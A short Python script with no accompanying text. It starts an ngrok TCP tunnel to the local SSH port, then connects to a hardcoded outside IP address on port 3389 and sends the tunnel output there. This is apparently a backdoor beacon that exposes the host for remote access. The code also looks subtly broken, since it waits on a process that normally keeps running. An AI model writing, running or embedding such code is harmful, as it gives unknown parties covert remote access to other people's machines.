import socket
import subprocess
output = subprocess.check_output(["ngrok", "tcp", "22"], shell=True)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
port = 3389
print("Trying to connect...")
s.connect(('34.95.19.212', port))
print (s.recv(1024).decode())
s.sendall(output)
s.close()